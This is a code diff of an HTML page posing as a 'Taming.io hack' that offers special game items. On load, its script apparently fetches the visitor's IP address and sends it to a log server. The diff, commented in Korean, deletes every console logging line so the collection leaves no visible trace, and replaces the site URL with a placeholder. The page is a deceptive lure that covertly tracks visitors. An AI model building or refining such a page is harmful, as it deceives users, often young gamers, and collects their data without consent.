@@ -6,7 +6,7 @@
     <meta property="og:title" content="Taming.io hack">
     <meta property="og:description" content="Click here to get special items for Taming.io!">
     <meta property="og:image" content="https://i.imgur.com/CIpGROL.jpeg">
-    <meta property="og:url" content="https://tamingiohack.netlify.app/">
+    <meta property="og:url" content="[여기에-Netlify-주소를-넣으세요]">
     <style>
         body { font-family: sans-serif; text-align: center; padding: 50px; }
         h1 { color: #333; }
@@ -17,7 +17,6 @@
     <p id="status">wait.....</p>
 
     <script>
-        // 위치 정보 요청 부분이 없는 원래의 스크립트
         window.onload = function() {
             const statusElement = document.getElementById('status');
             
@@ -36,12 +35,17 @@
                     })
                     .then(res => res.json())
                     .then(logResult => {
-                        console.log('Log server response:', logResult.message);
+                        // 아래에 있던 console.log 줄을 삭제했습니다.
                         statusElement.textContent = 'bye';
                     })
-                    .catch(err => console.error('Failed to send log to server:', err));
+                    .catch(err => {
+                        // 에러가 발생했을 때의 console.error도 삭제했습니다.
+                        statusElement.textContent = '오류가 발생했습니다.';
+                    });
                 })
-                .catch(error => console.error('Failed to get IP address:', error));
+                .catch(error => {
+                    // 여기의 console.error도 삭제했습니다.
+                });
         };
     </script>
 </body>
